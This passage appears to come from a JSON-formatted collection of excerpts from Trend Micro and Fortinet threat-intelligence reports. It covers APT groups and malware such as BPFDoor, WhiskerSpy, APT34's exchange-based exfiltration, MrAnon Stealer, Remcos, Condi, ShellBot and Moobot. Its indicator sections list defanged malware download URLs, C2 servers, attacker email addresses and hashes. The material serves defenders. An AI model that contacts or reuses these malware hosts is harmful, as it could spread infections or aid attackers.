transactions (token approval limits) and ensure that it has not been modified or issued by an untrusted party.\nIn the next blog entry, we are going to share our additional findings related to Water Labbu's infection chains, which includes their successful exploitation techniques and the patching of an ElectronJS-based application used by scammer", "source": "Trendmicro"}, {"title": "Introduction", "content": "Advanced persistent threat (APT) groups have broadened their focus to include Linux and cloud servers in the past few years. Noticeable examples includeransomware groupstargetingVMware ESXi servers, Mirai botnet variants, and groups targeting the cloud with stealers andcryptomining malware.\nSimilarly, APT groups have increased their presence on non-Windows targets. An example isSandwormattacking routers shipped with Linux. While malware used by cybercrime usually has the broadest possible targets, malware used by APT groups are mostly about keeping and maintaining routines' stealth. Red Menshen (also known as DecisiveArchitect or Red Dev 18), an APT grouptargeting interestsin the Middle East and Asian countries, has been constantly improving itsBPFDoorbackdoor over the years after it emerged in 2021. BPFDoor has since become more difficult to detect due to the improved usage of Berkeley Packet Filter (BPF), a technology that allows programs to attach network filters to an open socket that's being used by  the threat actors behind BPFDoor to bypass firewalls' inbound traffic rules and similar network protection solutions in Linux and Solaris operating systems (OS). Trend Micro detects the Linux and Solaris BPFDoor versions asBackdoor.Linux.BPFDOORand Backdoor.Solaris.BPFDOOR.ZAJE , respectively. Additional patterns related to the indicators have also been added for Trend products' monitoring and detection.\nThis entry shows how Red Menshen evolved their BPF filters with a six-fold increase in their BPF programs' instructions when compared to samples found in 2022. This is a clear sign that BPFDoor is under active development and that it has been proven successful enough for the attacks to merit a return on the malware developers' investment from this upgrade effort. In this entry, we also give security insights and suggest techniques for defenders to detect the presence of BPFDoor in infected systems.", "source": "Trendmicro"}, {"title": "Conclusion", "content": "Embedding BPF bytecode in malware samples represents a new challenge for security teams, particularly for malware analysts and network defenders. Inspecting these programs is key to create accurate file and network traffic rules. But analysts' and security teams' work might not be trivial and have their work cut out for them in going through the samples, especially due to the lack of tools to analyze and debug BPF bytecode. The usage of BPF filters adds a certain layer of sophistication rarely seen in cybercrime, although it exists in addition to APT attacks.\nOne malware example where the abuse of BPF filters has been observed isSymbiotemalware. Although BPF filters are not new, they are not heavily used by malware. Tools such IDA Pro and most disassemblers are not natively ready, but they can be extended with plugins. An exception isRadare2, an open-source framework that functions as a reverse engineering toolkit. The Linux kernel team also provides a few command line tools to deal with BPF filters, but can be further improved for analysts' use. Additionally, we are not aware of any malware training currently covering this. For that reason, we can consider it a \"new\" thing on the malware analysis side, and might be a consideration for malware and threat trainers to add in their respective programs.\nThe evolution of BPF filters used by BPFDoor also shows that threat actors are working to improve their methods to cover their tracks and keep the backdoor stealthy. We recommend network defenders to update their existing rules to reflect these changes, and for malware analysts to jump intoBPF filter analysisas soon as possible.\nAttacks involving BPFDoor can give the attackers complete access to the infected machine. Defenders should really pay attention to the BPF programs running in their environments.", "source": "Trendmicro"}, {"title": "Introduction", "content": "Trend Research's consistent monitoring and investigation efforts have uncovered Earth Alux's stealthy activities and advanced techniques. One of the tools in the arsenal of this advanced persistent threat group (APT) is its primary backdoor, VARGEIT. \nLeft undetected, the attack can maintain a foothold in the system and carry out cyberespionage. The long-term collection and exfiltration of data could lead to far-reaching consequences, such as disrupted operations and financial losses. \nThe attacks are targeted toward the Asia-Pacific (APAC) and Latin American regions, hitting key sectors such as government, technology, logistics, manufacturing, telecommunications, IT services, and retail. \nRegular patching and updating, vigilant monitoring for any signs of compromise, and proactive protection can help prevent such threats from infiltrating organizations' systems.\nThe Earth AluxAPTgroup's schemes and tactics have been uncloaked through our relentless monitoring and investigation efforts. The China-linked intrusion set is actively launching cyberespionage attacks against the government, technology, logistics, manufacturing, telecommunications, IT services, and retail sectors.\nThe first sighting of its activity was in the second quarter of 2023; back then, it was predominantly observed in the APAC region. Around the middle of 2024, it was also spotted in Latin America.\nEarth Alux has also been observed to conduct regular tests for some of its toolsets to ensure stealth and longevity in the target environment.", "source": "Trendmicro"}, {"title": "recommendation", "content": "Earth Alux represents a sophisticated and evolving cyberespionage threat, leveraging a diverse toolkit and advanced techniques to infiltrate and compromise a range of sectors, particularly in the APAC region and Latin America.\nIts reliance on the VARGEIT backdoor, along with the use of COBEACON and various loading methods, highlights a strategic approach to maintaining stealth and persistence within target environments.\nThe group's ongoing testing and development of its tools further indicate a commitment to refining its capabilities and evading detection.\nUnderstanding the operational methods associated with Earth Alux is crucial for developing effective defenses and mitigating the risks posed by such advanced cyber threats. To bolster protection against APT attacks, organizations can adopt a proactive security mindset by implementing security best practices such as the following:\nPeriodically patch and update systems used, as attackers can take advantage of vulnerabilities to gain initial access. \nPerform vigilant monitoring to observe any unusual activity such as an uncommonly heavy network activity, reduced performance and speed, and so on. \nLeverage solutions that help organizations take a proactive security stance and manage security holistically with comprehensive prevention, detection, and response capabilities.\nAs organizations continue to face the challenges posed by Earth Alux, it is imperative to enhance their cybersecurity measures, adopt proactive threat detection strategies, and remain vigilant against the evolving tactics of this persistent adversary.", "source": "Trendmicro"}, {"title": "Introduction", "content": "In our previousresearch, we disclosed and analyzed a new campaign initiated by the threat actor group Earth Preta (aka Mustang Panda). In a more recent campaign we've been tracking, we discovered Earth Preta delivering lure archives via spear-phishing emails and Google Drive links. After months of investigation, we found that several undisclosed malware and interesting tools used for exfiltration purposes were used in this campaign. We also observed that the threat actors were actively changing their tools, tactics, and procedures (TTPs) to bypass security solutions. In this blog entry, we will introduce and analyze the other tools and malware used by Earth Preta.", "source": "Trendmicro"}, {"title": "Conclusion", "content": "Over the past year, security researchers have been discovering and analyzing Earth Preta's campaigns and toolsets.  We were able to attribute some of these to Earth Preta based on similarities among the TTPs, the malware being used, and the timeline of the campaigns. Starting October 2022, the threat actors changed the arrival vector of the TONEINS, TONESHELL, and PUBLOAD malware. Instead of attaching malicious archives or Google Drive links to an email, they now embed the download link in another decoy document and add a password to the archive.\nBased on our observations, Earth Preta tends to hide malicious payloads in fake files, disguising them as legitimate ones - a technique that has been proven effective for avoiding detection. As for privilege escalation, the threat actors tend to reuse codes copied from open-source repositories. Meanwhile, they developed customized toolsets designed to collect confidential documents in the exfiltration stage.\nOverall, we believe that Earth Preta is a capable and organized threat actor that is continuously honing its TTPs, strengthening its development capabilities, and building a versatile arsenal of tools and malware.To help prevent potential threats such as the one posed by advanced persistent threat (APT) groups, we suggest that organizations conduct phishing awareness training for their employees and partners to stress the importance of caution when opening emails, particularly those messages from unfamiliar senders or with unknown subjects.\nTo assist organizations in protecting themselves against sophisticated threats, we recommend adopting a comprehensive security strategy that employs advanced technologies capable of identifying and halting such threats across multiple channels, includingendpoints,servers,networks, andemail communications.", "source": "Trendmicro"}, {"title": "Introduction", "content": "We discovered a new backdoor which we have attributed to theadvanced persistent threat actor known as Earth Kitsune, which we have covered before. Since 2019, Earth Kitsune has been distributing variants of self-developed backdoors to targets, primarily individuals who are interested in North Korea. In many of the cases, we have investigated in the past, the threat actor used watering hole tactics by compromising websites related to North Korea and injecting browser exploits into them. In the latest activity we analyze here, Earth Kitsune used a similar tactic but instead of using browser exploits, employed social engineering instead.\nAt the end of 2022, we discovered that the website of a pro-North Korean organization was compromised and modified to distribute malware. When a targeted visitor tries to watch videos on the website, a malicious script injected by the attacker displays a message prompt notifying the victims with a video codec error to entice them to download and install a trojanized codec installer. The installer was patched to load a previously unseen backdoor, that we dubbed \"WhiskerSpy.\" In addition, we also found the threat actor adopting an interesting persistence technique that abuses Google Chrome's native messaging host.\nIn this blog post, we are going to reveal the infection chain and technical details of the WhiskerSpy backdoor employed by Earth Kitsune.", "source": "Trendmicro"}, {"title": "Attribution", "content": "Our findings allow us to attribute this attack to the Earth Kitsune threat actor with medium confidence. Injecting malicious scripts into North Korean-related websites shows a similar modus operandi and victimology to the previous activities of the group. Furthermore, the delivery server and the C&C server of WhiskerSpy used in this attack have two infrastructure overlaps with our previous research onOperation Earth Kitsune.\nThe first overlap we noticed is that both WhiskerSpy's C&C domain londoncity[.]hopto[.]org and Earth Kitsune's domain rs[.]myftp[.]biz were resolved to the same IP address 45[.]76[.]62[.]198. \nThe second overlap is that WhiskerSpy's C&C domains londoncity[.]hopto[.]org and updategoogle[.]servehttp[.]com, plus the domain of the delivery server microsoftwindow[.]sytes[.]net were all resolved to 172[.]93[.]201[.]172. This IP address was also mapped from the domain selectorioi[.]ddns[.]net which was used by Earth Kitsune's agfSpy backdoor.", "source": "Trendmicro"}, {"title": "Conclusion", "content": "This threat is very interesting from a technical perspective. It patches the legitimate installers to hide its activities, uses lesser-known hashing algorithms to compute machine IDs and session IDs and employs ECC to protect encryption keys. In addition, the presented methods of persistence are also quite unique and rare. This shows that Earth Kitsune are proficient with their technical abilities and are continuously evolving their tools, tactics, and procedures TTPs.\nTo help organizations defend themselves from advanced threats, We recommend using a multilayered security approach and technologies that can detect and block these types of threats from infiltrating the system throughendpoints,servers,networks, andemails.", "source": "Trendmicro"}, {"title": "Introduction", "content": "On December 2022, we identified a suspicious executable (detected by Trend Micro as Trojan.MSIL.REDCAP.AD) that was dropped and executed on multiple machines. Our investigation led us to link this attack to advanced persistent threat (APT) group APT34, and the main goal is to steal users' credentials. Even in case of a password reset or change, the malware is capable of sending the new credentials to the threat actors. Moreover, after analyzing the backdoor variant deployed, we found the malware capable of new exfiltration techniques - the abuse of compromised mailbox accounts to send stolen data from the internal mail boxes to external mail accounts controlled by the attackers. While not new as a technique, this is the first instance that APT34 used this for their campaign deployment. Following this analysis, it is highly likely that this campaign's routine is only a small part of a bigger chain of deployments. Users and organizations are strongly advised to reinforce their current security measures and to be vigilant of the possible vectors abused for compromise.", "source": "Trendmicro"}, {"title": "Attribution", "content": "There are several data points and indicators that suggest APT34 carried out this attack, and that this group is still active in targeting countries in the Middle East with a special focus on compromising government entities.\n1.     The first stage dropper\nThe first stage dropper between the Saitama backdoor and this new operation's first stage .Net dropper have a few similarities. Despite the dated Saitama operation's first stage dropper, a VBA macro that drops the actual .Net backdoorSaitama malware, the new attack implemented in the group's latest deployment is a .Net dropper that drops the actual malware. Both deployments' final stages leverage EWS' Managed API (Microsoft.Exchange.WenServices.dll).\n2.     Leveraging exchange servers for communications (Uni- and bidirectional)\nBoth this campaign and the Karkoff campaign made use of targeted exchange servers and relayed communications through it. In the previous campaign, this wasreportedlydone with the deployment of the Karkoff implant. The old Karkoff sample attributed to APT34 share a common functionality for abusing the EWS API.\n3.      The victim targeted\nAPT34 has been documented for targeting countries in the Middle East. In aprevious campaignanalyzed by Yoroi Labs, the Karkoff sample (SHA256: 1f47770cc42ac8805060004f203a5f537b7473a36ff41eabb746900b2fa24cc8) attributed to APT34 has the mail server domain hardcoded inside the sample. Alongside the target mail recipient the attackers receive information from is the same hardcoded mail server domain found in the latest backdoor, including the targeted Exchange Server for a government ministry. Both samples included some hardcoded credentials as well. However, the newer backdoor includes support for stealing thenewpasswords of previously compromised users who changed their passwords, ensuring their legitimate accounts stay compromised.", "source": "Trendmicro"}, {"title": "Conclusion", "content": "At first glance, security teams can mistakenly tag the sample as safe or as a benign activity given the validity of the domains and mail credentials. It will take more experienced analysts to see that the domains abused is part of a bigger active directory domain \"forest\", which share a trust relationship with each other to allow different government ministries or agencies to communicate. Considering we found a compromised account from one entity inside a sample sourced from a different agency indicates APT34 now has a deep foothold in the government domain forest.\nFollowing the stages executed, APT34's repeated use of the Saitama backdoor technique in the first stage indicates a confidence that even the dated malware's technique will continue to work and initiate compromise.\nThe next stages for exfiltrating data, however, are considerably new and are considered exploratory for the group. Despite the routine's simplicity, the novelty of the second and last stages also indicate that this entire routine can just be a small part of a bigger campaign targeting governments. We continue tracking and monitoring the abuse of this threat to determine the depth and breadth of this compromise.", "source": "Trendmicro"}, {"title": "Indicators of Compromise", "content": "Emails abused\nJaqueline[.]Herrera@proton[.]me \nCiara[.]Stoneburner@proton[.]me \nmarsha[.]fischer556@gmail[.]com \nKathryn[.]Firkins@proton[.]me \nSusan[.]potts454@proton[.]me \nEarl[.]butler945@gmail[.]com\nAdditional insights provided by AbdelRahman Yasser.", "source": "Trendmicro"}, {"title": "Introduction", "content": "The espionage group Earth Kapre (aka RedCurl and Red Wolf) has been actively conducting phishing campaigns targeting organizations in Russia, Germany, Ukraine, the United Kingdom, Slovenia, Canada, Australia, and the US. It uses phishing emails that contain malicious attachments (.iso and .img), which lead to successful infections upon opening. This triggers the creation of a scheduled task for persistence, alongside the unauthorized collection and transmission of sensitive data to command-and-control (C&C) servers.\nThe Trend Micro Managed Extended Detection and Response (MDR) and Incident Response (IR) team conducted an investigation of an incident where numerous machines were infected by the Earth Kapre downloader.  This piece of malware was observed establishing connections with its C&C servers, suggesting a potential data theft scenario. Interestingly, in this instance, Earth Kapre has returned to using a previously known technique that is distinct from its more recent campaigns: It used legitimate toolsPowershell.exeandcurl.exeto procure the subsequent stage downloader. In an attempt to blend into the network and evade detection, Earth Kaprewas found to have used the Program Compatibility Assistant (pcalua.exe) to execute malicious command lines.\nThis blog entry will examine Trend Micro MDR team's investigation that successfully uncovered the intrusion sets employed by Earth Kapre in a recent incident, as well as how the team leveraged threat intelligence to attribute the extracted evidence to the cyberespionage threat group.", "source": "Trendmicro"}, {"title": "Attribution", "content": "Multiple data points and indicators strongly indicate Earth Kapre's involvement in this attack, underscoring the ongoing activity of this group, which we will explain in detail in this section.\n-       The C&C infrastructure\nAll observed C&C servers pivoted to23[.]254[.]224[.]79, which is an IP address that's been extensively used as a C&C server by Earth Kapre, based on samples found from the latter part of 2023 to the present.\nThe IP address198[.]252[.]101[.]86, which was provided as an argument to theClient.pyscript, is linked to one of the phishing emails sent by the Earth Kapre group. This phishing email contains an attachment that leads to the download of a malicious LNK file and the Earth Kapre downloader.\nThe connection between the IP address and the phishing email can be determined from the mail header, as the IP address appears as the first hop in the mail route from the threat actor to the victim.\n-       Code and behavior similarities\nThe sample we examined exhibited code similarities with known Earth Kapre downloaders used in previous campaigns. While the sample from the incident we handled appeared somewhat different at first glance, a closer analysis revealed striking similarities in functionality.\nFor example, the string decryption function in the new sample we examined gets addresses for Bcrypt APIs and calls them in the runtime as opposed to importing them, which is what older and available samples did. However, the sample we examined decrypts strings in a way that's reminiscent of the decryption technique used by older samples:\nCalculate SHA256 for hard-coded string (yxNLWpc0s4JUTR8O3GOJC). \nUse part of the hash as an encryption key for Advanced Encryption Standard (AES) decryption.\nThe simple comparison between the older and newer Earth Kapre downloader samples shows that there is a 70% to 90% similarity between the samples. We also noted a similarity in how the samples behaved, such as in the manner they check for internet availability and communicate with their C&C server.", "source": "Trendmicro"}, {"title": "Conclusion", "content": "This case underscores the ongoing and active threat posed by Earth Kapre, a threat actor that targets a diverse range of industries across multiple countries. The actor employs sophisticated tactics, such as abusing PowerShell, curl, and Program Compatibility Assistant (pcalua.exe) to execute malicious commands, showcasing its dedication to evading detection within targeted networks.\nThe detection of Impacket activity within the organization's network reveals a concerning trend in the abuse of this tool for Windows network protocol interactions. Threat actors are capitalizing on Impacket's versatility and exploiting its functionalities for unauthorized command execution.\nThis report emphasizes the significance of threat intelligence in bridging gaps within investigations, filling missing pieces of evidence that are crucial for comprehensive understanding and protection. Understanding the threat actor behind an attack is paramount for organizations seeking to bolster their defenses. This knowledge not only aids in identifying potential motives but also allows for the implementation of tailored security measures to help prevent specific threats.\nThe role of MDR in uncovering intrusion sets, as demonstrated in this recent incident investigation, exemplifies its critical contribution to cybersecurity. MDR played a key role in attributing the evidence extracted from the attack to the Earth Kapre threat group. This reinforces the essential role of advanced threat detection and response solutions in effectively countering sophisticated threat actors.\nOrganizations should also consider using a multilayered approach to guard possible entry points into the system (endpoint, email, web, and network). The following Trend Micro solutions can detect malicious components and suspicious behavior to help keep enterprises secure:\nTrend Vision Oneprovides multilayered protection and behavior detection, which helps block questionable behavior and tools early on before ransomware can do irreversible damage to the system. \nTrend Cloud One\u2122 \u2013 Workload Securityprotects systems against both known and unknown threats that exploit vulnerabilities. This protection is made possible through techniques such as virtual patching and machine learning. \nTrend Micro\u2122 Deep Discovery\u2122 Email Inspectoremploys custom sandboxing and advanced analysis techniques to effectively block malicious emails, including phishing emails that can serve as entry points for ransomware. \nTrend Micro Apex One\u2122offers next-level automated threat detection and response against advanced concerns such as fileless threats and ransomware, ensuring the protection of endpoints.", "source": "Trendmicro"}, {"title": "Introduction", "content": "Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The information collected can be used for future attacksSeverity Level:High\nFortiGuard Labs recently identified an email phishing campaign using deceptive booking information to entice victims into clicking on a malicious PDF file. The PDF downloads a .NET executable file created with PowerGUI and then runs a PowerShell script to fetch the final malware, known as MrAnon Stealer. This malware is a Python-based information stealer compressed with cx-Freeze to evade detection. MrAnon Stealer steals its victims' credentials, system information, browser sessions, and cryptocurrency extensions. Figure 1 illustrates the attack flow.\nThe downloader URL was mostly queried in Germany, which suggests it was the primary target of the attack. The number of queries for this URL rose significantly in November 2023, implying the campaign was more active and aggressive during that month. In this article, we will detail the behavior of this malware at each stage.", "source": "Fortinet"}, {"title": "Conclusion", "content": "In this attack, the threat attacker sends phishing emails with fake room booking details, aiming at specific regions. The malware uses PowerGUI and cx-Freeze tools to create a complex process that involves .NET executable files and PowerShell scripts. The attacker also uses tricks like false error messages to hide successful infection. The malware downloads and extracts files from a specific domain to run a harmful Python script. The script extracts clean DLL files and malware named \"python.exe.\" These are used to cover up the loading of the malicious payload-MrAnon Stealer. It steals data and sensitive information from several applications and then compresses and uploads the stolen data to a public file-sharing website and the threat actor's Telegram channel. Users should be careful of phishing emails and unclear PDF files.\nFortinet Protections\nThe malware described in this report are detected and blocked byFortiGuard Antivirusas:\nPDF/Agent.AZN!tr.dldrMSIL/Agent.FT!trPOWERSHELL/Agent.F6C9!trPython/Stealer.AZN!trW64/Agent.7E0B!tr\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\nThe URLs are rated as \"Malicious Websites\" by theFortiGuard Web Filteringservice.\nThe FortiGuard CDR (content disarm and reconstruction) service can detect and disarm the malicious macros embedded in this email.\nWe also suggest that organizations go through Fortinet's freeNSE training:Fortinet Certified Fundamentals (FCF). The FCF training helps end users learn how to identify and protect themselves from phishing attacks.\nFortiGuard IP Reputation and Anti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident Response Team.", "source": "Fortinet"}, {"title": "ioc", "content": "Hostnames\nanonbin[.]iranoncrypter[.]com\nFiles:\n075e40be20b4bc5826aa0b031c0ba8355711c66c947bbbaf926b92edb2844cb048e09b8043c0d5dfc2047b573112ead889b112108507d400d2ce3db18987f6c90efba3964f4b760965e94b4d1a597e6cd16241b8c8bf77a664d6216d1420b3128a8c9acf09c84ab5ea4c098eace93888a88b82a1485255073c93ce6080d05ec796ec8ef2338d36b7122a76b0398d97e8d0ed55c85e31649ea00e57d6b1f536288b71525ca378463784ce2d81a8371714580c58f0d305a2aa4630dc964c8c0ee045ee224e571d0fd3a72af1d7a7718e61a1aad03b449cf85377411d51c135bb22", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Fully remotely control a victim's computerSeverity level:High\nFortinet's FortiGuard Labs recently noticed a phishing campaign in the wild. It is initialized with a phishing email containing a malicious Excel document. Upon researching the campaign, I found it was spreading a new variant of the Remcos RAT.", "source": "Fortinet"}, {"title": "Summary", "content": "In this analysis, I walked through the entire process of the phishing campaign. It begins with a phishing email with an attached OLE Excel document. This disguised email is used to trick the recipient into opening the attached Excel document.\nThe CVE-2017-0199 vulnerability is exploited once the Excel file is opened on the victim's device. It then downloads an HTA file and executes it on the device. Multiple script languages are leveraged to download an EXE file (dllhost.exe), which then starts the 32-bit PowerShell process to load the malicious code from extracted files and execute it in the PowerShell process.\nNext, I explained what anti-analysis techniques are used in the code, such as a vectored exception handler, dynamically gained APIs, dynamically calculated constant numbers, the APIs ZwSetInformationThread() and ZwQueryInformationProcess(), and API hooking.\nAfter passing the detections introduced in the anti-analysis part, it performs process hollowing to run the malicious code in the new process \"Vaccinerende.exe,\" which not only ensures persistence on the victim's device but also downloads and decrypts the Remcos payload file.\nI then elaborated on how it keeps Remcos in memory and starts its entry point function in a thread (API NtCreateThreadEx()).\nSubsequently, I explained how Remcos works with its setting block on the victim's device, how Remcos communicates with its C&C server, and what the format of the traffic packet looks like.\nFinally, I focused on introducing the features this Remcos variant can perform on the victim's device and listing the relevant control commands for each feature.\nFigure 20 shows the entire process of the phishing campaign.", "source": "Fortinet"}, {"title": "ioc", "content": "hxxps://og1[.]in/2Rxzb3hxxp://192[.]3[.]220[.]22/xampp/en/cookienetbookinetcahce.htahxxp://192[.]3[.]220[.]22/hFXELFSwRHRwqbE214.binhxxp://192[.]3[.]220[.]22/430/dllhost.exe\n107[.]173[.]4[.]16:2404\n[PO-9987689987.xls]4A670E3D4B8481CED88C74458FEC448A0FE40064AB2B1B00A289AB504015E944\n[cookienetbookinetcahce.hta]F99757C98007DA241258AE12EC0FD5083F0475A993CA6309811263AAD17D4661\n[dllhost.exe / Vaccinerende.exe]9124D7696D2B94E7959933C3F7A8F68E61A5CE29CD5934A4D0379C2193B126BE\n[Aerognosy.Res]D4D98FDBE306D61986BED62340744554E0A288C5A804ED5C924F66885CBF3514\n[Valvulate.Cru]F9B744D0223EFE3C01C94D526881A95523C2F5E457F03774DD1D661944E60852\n[Remcos / Decrypted hFXELFSwRHRwqbE214.bin]24A4EBF1DE71F332F38DE69BAF2DA3019A87D45129411AD4F7D3EA48F506119D", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected platforms:LinuxImpacted parties:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity level:Critical\nFortiGuard Labs encountered recent samples of aDDoS-as-a-service botnet calling itself Condi. It attempted to spread by exploiting TP-Link Archer AX21 (AX1800) routers vulnerable toCVE-2023-1389, which was disclosed in mid-March of this year. We have additionally observed an increasing number of Condi samples collected from our monitoring systems since the end of May 2023, indicating an active attempt to expand the botnet.\nThis blog details the capabilities of this botnet.", "source": "Fortinet"}, {"title": "Conclusion", "content": "Malware campaigns, especially botnets, are always looking for ways to expand. Exploiting recently discovered (or published) vulnerabilities has always been one of their favored methods, as we highlighted above for the Condi botnet. Thus, it is strongly recommended to always apply the latest security patches and updates as soon as possible.\nAs always, FortiGuard Labs will continue to monitor these campaigns.", "source": "Fortinet"}, {"title": "ioc", "content": "Files\n091d1aca4fcd399102610265a57f5a6016f06b1947f86382a2bf2a668912554f291e6383284d38f958fb90d56780536b03bcc321f1177713d3834495f64a3144449ad6e25b703b85fb0849a234cbb62770653e6518cf1584a94a52cca31b11904e3fa5fa2dcc6328c71fed84c9d18dfdbd34f8688c6bee1526fd22ee1d749e5a509f5bb6bcc0f2da762847364f7c433d1179fb2b2f4828eefb30828c485a3084593e75b5809591469dbf57a7f76f93cb256471d89267c3800f855cabefe493155e841db73f5faefe97e38c131433689cb2df6f024466081f26c07c4901fdf612cbff9c7b5eea051188cfd0c47bd7f5fe51983fba0b237f400522f22ab91d2772ccda8a68a412eb1bc468e82dda12eb9a7c9d186fabf0bbdc3f24cd0fb20458cce7a4aae413d4742d9c0e25066997153b844789a1409fd0aecce8cc6868729a15f7fb5f3dc06aebcb56f7a9550b005c2c4fc6b2e2a50430d64389914f882d67cf\nDownload URLs\nhxxp://85[.]217[.]144[.]35/armhxxp://85[.]217[.]144[.]35/arm5hxxp://85[.]217[.]144[.]35/arm6hxxp://85[.]217[.]144[.]35/arm7hxxp://85[.]217[.]144[.]35/m68khxxp://85[.]217[.]144[.]35/mipshxxp://85[.]217[.]144[.]35/mpslhxxp://85[.]217[.]144[.]35/ppchxxp://85[.]217[.]144[.]35/sh4hxxp://85[.]217[.]144[.]35/x86hxxp://85[.]217[.]144[.]35/x86_64hxxp://85[.]217[.]144[.]35/abc3.shhxxp://cdn2[.]duc3k[.]com/t\nC2s\n85[.]217[.]144[.]35cdn2[.]duc3k[.]com", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected platforms:Windows, LinuxImpacted parties:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity level:Critical\nFortiGuard Labs observed several attacking bursts targeting Cacti and Realtek vulnerabilities in January and March of this year and then spreading ShellBot and Moobot malware. (Figure 1 shows trigger counts from our IPS signatures of the CVE-2021-35394 (Realtek) and CVE-2022-46169 (Cacti) vulnerabilities.)\nShellBot is a malware developed in Perl that uses the Internet Relay Chat (IRC) protocol to communicate with the server, also known as PerlBot. Moobot is a Mirai variant botnet that targets exposed networking devices. We discovered that it had attackedHikvision products in 2021. Compromised endpoints can be controlled by its C&C server and deliver further attacks, such as distributed denial-of-service attacks.\nThis article will examine the payloads of these two attacks and their resulting malware behavior.", "source": "Fortinet"}, {"title": "Conclusion", "content": "Over the past few months, threat actors have been spreading ShellBot and Moobot malware on exploitable servers. Compromised victims can be controlled and used as DDoS bots after receiving a command from a C2 server. Because Moobot can kill other botnet processes and also deploy brute force attacks, administrators should use strong passwords and change them periodically. Moreover, some of the ShellBot variants can install other malware from their C2 server.\nThe vulnerabilities mentioned above have a critical security impact that can lead to remote code execution. Therefore, it is highly recommended that patches and updates be applied as soon as possible.", "source": "Fortinet"}, {"title": "ioc", "content": "Malware Host:\n104[.]244[.]76[.]105\n156[.]224[.]24[.]249\n206[.]217[.]205[.]24\n199[.]195[.]250[.]172\n80[.]68[.]196[.]6\n85[.]239[.]33[.]32\n46[.]101[.]183[.]162\nC2 Server:\n49[.]212[.]234[.]206:3303\n198[.]98[.]61[.]106:8080\njuice[.]baselinux[.]net:6667\napid[.]mutoujs[.]xyz\ntroon[.]dns[.]army\nbotnet[.]goelites[.]cc\nj[.]xnyidc[.]top\nwww[.]xiaojue[.]cyou\nbot[.]layer7[.]top\nFiles - Moobot:\nbc1ded2f3a9fc50614a159b3971a26868e6a5b09a6f6ba65d6bee1b05335e69b\n55048b3df95d4dbb681be32cfe6c9e4a128045917c49da9ff1c30723debc1854\n661f0fb1cf928c40333eaefc86522ddc74c7b96a8e32b93ed8153b8244d66721\nd3b13f71e7637d7118ac3e170d33b3bbb15814357e21fa3318b4bf7ecbe6dc7b\n0d4be7af347f2cb80dcd71cd94f1f39a6f3dbe71765d824bb0d66c11b8759cd7\ne2075d6b723d7daf2303af31e3970ed79d435e52b4338ee63499c4644332ea10\n3dbea4436ef3e00dcfb73608164e3d1ded9434f8ee1679cd3a790e22c91cbe11\n455314a186b4a9a1788e2acb85a9b6b34fb0a7700d0decc6de056030fea543df\ncd47c9db5e3ec59221361ca7459bb12a5a84014c1f8aa2e2bdad07ccb37a4e29\n9144c4768b457fb5384bc807d9e992671c25dbefe9d2781672c018e1b4d8c36a\n979bf642f67d5df2e8fa664c0bdecbc2954c9ced44f47122c71ad5f71a52aa0d\ne2ff90f5bdf51da577be88266cc9dc8be48f1776af46949dcdd2d54e4c84449f\n0cb77fabcef38d5ec4e1e64945bac8c33ea8e97346a3140e67ec30eecedc9ea0\n0cd6a246eb6933bf5ac8639d8972e2c80dcdb7723a15435a914cf6b5bd30af4c\ncf1b136558e7b5faf6bfce3b460afed06e613ca6747257273571399d106dea2b\n175b536d5c825b78bd2567b836bb18046928f33f7ae1865afb66a4fe064ebb81\ncdf1c2610bde8ae870bc083d06fb00ba1c3441c075fc6c26e9cc9f93c9a3703f\n903c340da7c6ef32b2e3098389748fc5d94e88e61bfeea8a67313327f021fb9f\n33aa8e731eca7ba051626845541f91fad6f69862aa1deaea7b80a15dae8d67bf\nf473597e5fda9051522a52c78965d0eb050ff2971cfce8d359618e1c136ad77b\nde5e60ab541838c4c3cb0bfd0733417f2fe4a19bac08683391022cdaabe263de\n565d09c8fc9f712b82eae45a39029ac996904564cc08dae6306678081087e933\nc33c66e7a161718da4535b34078edb04600c5a06eb1e05fe514a5ad5ac149594\ne356ba8fe6ae21fbbba785ade3220a666e3fae947c68093e05b01f0c3f98e15f\n7e4dadf93fbb7a01b55eadacbb40ae8d5e95f5b9592e55f0fb2340d89fc78f17\nae2c71e3e177721c336f76946d24b95512accf677c87e829a31b315d56624df3\ne1366976365db1f2bffdc37d4e64e12f883f9a20e02b12d52b6a1b346b8f0692\nabb3d04a081ee199cfb5687361fbbca3fa2012f588832e05de0e21874f162afd\n5f0f2b2e3e839e50631b89cc2e9d980b337db417cab51f21beb0a56043297a6f\n7d2c0cba18d51ed84e7a888d56dbcb5e73c1d076ed5f8e5db2528f826601b2cc\n9a067e32dd6c25053c302de7caf61cdc0f3982289eb91d06c449fe08a47fc6d3\n6804cebbf837d7c5559519c364cc0b20c4f9b514c74039321bc69bcfdbfb5e93\n947675c8b2a65bf9b38f4d3d15d108e0826f570086c6a758d3e02be9315da1cd\nFiles - ShellBot\nc05cf5b2c94edd15c40db1ce52f97bdc09ec61e78386c8878b15515cbde99528\n47ac3a2c51fc64479ceff1e842a414bc11dc59b9dcdbd3dd1bf011e243f91ffa\n0c67234ce88958c9319ca9a8f8fdc4b48690136871515324509ac956704f1373\nb7d62d1a145ddda241e624ef94ab31fcca1a13f79e130d0a704586e35745282a", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:WindowsImpacted Users:Windows usersImpact:Controls victim's machine and collects sensitive informationSeverity Level:Medium\nOccasionally, FortiGuard Labs researchers come across a file name or e-mail subject that makes us sit up and take notice. Of course, it may turn out to be nothing. But every once in a while, one of these turns out to be incredibly interesting.\nWe recently came across one such file that referenced an Indian state military research organization and an in-development nuclear missile. The file was meant to deploy malware with characteristics matching the APT group \"SideCopy.\" With activities dating back to at least 2019, this group has aligned its targeting with the goals and objectives of the Pakistani government.\nThe SideCopy APT group is known to leverage similar 